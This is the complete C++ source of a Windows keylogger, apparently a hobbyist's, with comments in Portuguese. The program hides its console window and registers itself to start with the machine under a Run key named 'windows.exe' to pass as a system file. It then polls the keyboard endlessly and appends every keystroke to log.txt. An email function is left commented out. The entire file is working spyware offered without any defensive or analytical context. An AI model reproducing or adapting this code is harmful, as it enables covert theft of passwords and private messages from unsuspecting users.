#include <iostream>
#include <windows.h>
#include <winreg.h>
#include <locale.h>
#include <conio.h>
#include <stdlib.h>
#include <stdio.h>


using namespace std;
void salvar(char tecla, char *file);
void verificar(int a);
HKEY Chave;
int main(){

//janela invisivel
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
//janela invisivel


	RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &Chave);
	RegSetValueEx(Chave, "windows.exe", 0, 1, (LPBYTE)"C:\\windows.exe", 22);
	RegCloseKey(Chave);


//email();

    setlocale(LC_ALL,""); //permite caracteres especiais
    char a;
    //loop checar teclas
    while(true){
        for(a=8;a<=190;a++){
            if(GetAsyncKeyState(a) == -32767){
                verificar(a);
            }
        }
    }

    return 0;
}
void verificar(int a){
    char tecla = (char) a; //casting
    salvar(tecla,"log.txt");
}

void salvar(char tecla, char *file){

    FILE *newarquivo;
    newarquivo = fopen(file, "a+");

    cout << tecla;

    fprintf(newarquivo, "%c", tecla);

    fclose(newarquivo);
}
